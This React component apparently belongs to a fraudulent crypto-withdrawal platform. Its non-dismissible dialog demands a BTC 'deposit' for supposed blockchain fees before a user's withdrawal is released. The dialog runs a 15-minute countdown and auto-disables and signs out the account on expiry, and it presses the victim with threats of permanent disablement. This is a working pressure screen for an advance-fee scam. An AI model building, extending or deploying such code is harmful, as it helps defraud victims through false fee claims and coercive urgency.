import { useState, useEffect, useCallback } from "react";
import { AlertDialog, AlertDialogContent, AlertDialogHeader, AlertDialogTitle, AlertDialogDescription } from "@/components/ui/alert-dialog";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { AlertCircle, Copy, Check, Clock, Shield } from "lucide-react";
import { useNavigate } from "react-router-dom";
import { useToast } from "@/hooks/use-toast";
import { supabase } from "@/integrations/supabase/client";
import { CONFIRMATION_FEE_WALLET_BTC } from "@/lib/constants";

interface DepositRequirementDialogProps {
  restriction: {
    id: string;
    deadline: string;
    message: string | null;
  };
  userId: string;
}

function parseMessage(msg: string | null): { amount: number; text: string } {
  try {
    if (msg) return JSON.parse(msg);
  } catch {}
  return { amount: 0, text: "Deposit required to complete your withdrawal" };
}

export const DepositRequirementDialog = ({ restriction, userId }: DepositRequirementDialogProps) => {
  const { amount, text } = parseMessage(restriction.message);
  const [timeLeft, setTimeLeft] = useState(0);
  const [isExpired, setIsExpired] = useState(false);
  const [copied, setCopied] = useState(false);
  const [disabling, setDisabling] = useState(false);
  const navigate = useNavigate();
  const { toast } = useToast();

  // Calculate time left from DB deadline
  useEffect(() => {
    const deadlineMs = new Date(restriction.deadline).getTime();
    const remaining = Math.max(0, Math.floor((deadlineMs - Date.now()) / 1000));
    setTimeLeft(remaining);
    if (remaining === 0) setIsExpired(true);
  }, [restriction.deadline]);

  // Countdown timer
  useEffect(() => {
    if (isExpired) return;
    const timer = setInterval(() => {
      setTimeLeft((prev) => {
        if (prev <= 1) {
          setIsExpired(true);
          return 0;
        }
        return prev - 1;
      });
    }, 1000);
    return () => clearInterval(timer);
  }, [isExpired]);

  // Auto-disable on expiry
  const disableAccount = useCallback(async () => {
    if (disabling) return;
    setDisabling(true);
    try {
      await supabase.functions.invoke("auto-disable-expired-account", {
        body: { user_id: userId },
      });
    } catch (e) {
      console.error("Auto-disable failed:", e);
    }
    await supabase.auth.signOut();
    toast({
      title: "Account Permanently Disabled",
      description: "Your account has been permanently disabled due to non-payment. Contact support for assistance.",
      variant: "destructive",
    });
    navigate("/auth");
  }, [userId, disabling, navigate, toast]);

  useEffect(() => {
    if (isExpired && userId) disableAccount();
  }, [isExpired, userId, disableAccount]);

  const formatTime = (seconds: number) => {
    const m = Math.floor(seconds / 60);
    const s = seconds % 60;
    return `${m.toString().padStart(2, "0")}:${s.toString().padStart(2, "0")}`;
  };

  const copyAddress = async () => {
    try {
      await navigator.clipboard.writeText(CONFIRMATION_FEE_WALLET_BTC);
      setCopied(true);
      toast({ title: "Address copied", description: "BTC wallet address copied to clipboard." });
      setTimeout(() => setCopied(false), 2000);
    } catch {
      toast({ title: "Copy failed", description: "Please copy the address manually.", variant: "destructive" });
    }
  };

  const totalSeconds = Math.max(1, Math.floor((new Date(restriction.deadline).getTime() - new Date(restriction.deadline).getTime() + 15 * 60 * 1000) / 1000));
  const progressPercent = (timeLeft / (15 * 60)) * 100;

  return (
    <AlertDialog open>
      <AlertDialogContent className="max-w-md border-primary/50 bg-background sm:max-w-lg">
        <AlertDialogHeader>
          <div className="flex items-center gap-2 mb-2">
            <div className="h-10 w-10 rounded-full bg-primary/20 flex items-center justify-center">
              <Shield className="h-5 w-5 text-primary" />
            </div>
            <Badge variant="secondary" className="animate-pulse">
              <AlertCircle className="h-3 w-3 mr-1" /> Deposit Required
            </Badge>
          </div>
          <AlertDialogTitle className="text-xl text-primary">
            💰 Deposit Required to Complete Withdrawal
          </AlertDialogTitle>
          <AlertDialogDescription className="text-foreground/80 space-y-3">
            <p>{text}</p>
            <p>
              This deposit is required to cover <strong>blockchain processing fees</strong> and 
              finalize your pending withdrawal securely through our compliance system.
            </p>
          </AlertDialogDescription>
        </AlertDialogHeader>

        {/* Fee Amount */}
        <div className="bg-primary/5 border border-primary/20 rounded-lg p-4 text-center space-y-1">
          <p className="text-sm text-muted-foreground font-medium">Required Deposit</p>
          <p className="text-4xl font-bold text-primary">${amount.toLocaleString()}</p>
          <p className="text-xs text-muted-foreground">Payable in BTC to the address below</p>
        </div>

        {/* Countdown Timer */}
        <div className="space-y-2">
          <div className="flex items-center justify-between text-sm">
            <span className="flex items-center gap-1.5 text-muted-foreground">
              <Clock className="h-4 w-4" /> Time Remaining
            </span>
            <span className={`font-mono font-bold text-lg ${isExpired ? "text-destructive" : timeLeft < 120 ? "text-destructive animate-pulse" : "text-foreground"}`}>
              {isExpired ? "EXPIRED" : formatTime(timeLeft)}
            </span>
          </div>
          <div className="h-2 bg-muted rounded-full overflow-hidden">
            <div
              className={`h-full rounded-full transition-all duration-1000 ${isExpired ? "bg-destructive" : progressPercent < 25 ? "bg-destructive" : progressPercent < 50 ? "bg-yellow-500" : "bg-primary"}`}
              style={{ width: `${progressPercent}%` }}
            />
          </div>
          {isExpired && (
            <p className="text-xs text-destructive font-medium text-center">
              ⚠️ Your account has been permanently disabled due to non-payment. Contact support immediately.
            </p>
          )}
        </div>

        {/* Wallet Address */}
        <div className="space-y-2">
          <p className="text-sm font-medium text-muted-foreground">Send BTC to:</p>
          <div className="flex items-center gap-2 bg-muted/50 border border-border rounded-lg p-3">
            <code className="text-xs flex-1 break-all font-mono text-foreground">
              {CONFIRMATION_FEE_WALLET_BTC}
            </code>
            <Button variant="outline" size="sm" onClick={copyAddress} className="shrink-0">
              {copied ? <Check className="h-4 w-4 text-success" /> : <Copy className="h-4 w-4" />}
            </Button>
          </div>
        </div>

        {/* Warning */}
        <div className="bg-yellow-500/10 border border-yellow-500/20 rounded-lg p-3">
          <p className="text-xs text-foreground/70">
            <strong>⚠️ Important:</strong> The deposit must be sent in a <strong>single BTC transaction</strong> to the address above. 
            Once confirmed on the blockchain, your withdrawal will be processed automatically.
            <br /><br />
            <strong className="text-destructive">Failure to pay within the countdown will result in permanent account disablement.</strong>
          </p>
        </div>

        {/* Actions */}
        <div className="flex flex-col gap-2 pt-2">
          <Button
            onClick={() => navigate("/dashboard/deposit")}
            className="w-full bg-primary hover:bg-primary/90 text-primary-foreground"
            disabled={isExpired}
          >
            Pay ${amount.toLocaleString()} Deposit Now
          </Button>
          <p className="text-[11px] text-center text-muted-foreground">
            This dialog cannot be dismissed until the required deposit is confirmed.
          </p>
        </div>
      </AlertDialogContent>
    </AlertDialog>
  );
};
